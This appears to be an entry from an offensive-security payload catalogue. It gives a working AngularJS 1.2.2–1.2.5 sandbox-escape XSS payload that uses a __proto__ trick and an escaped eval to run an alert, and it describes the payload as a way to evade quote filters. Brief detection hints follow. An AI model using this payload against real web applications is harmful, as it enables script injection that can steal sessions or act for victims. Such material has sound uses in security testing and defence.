---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - encoded-eval
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Proto-ValueOf-Encoded-Eval

## Code

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

## Description

__proto__ pollution to set charAt to valueOf, followed by escaped conditional eval for alert in AngularJS 1.2.2-1.2.5.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Escaped conditional. | N/A |

## Usage

Evasion for quote filters.

## Detection

- Escaped eval strings.
- Proto access via arrays.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
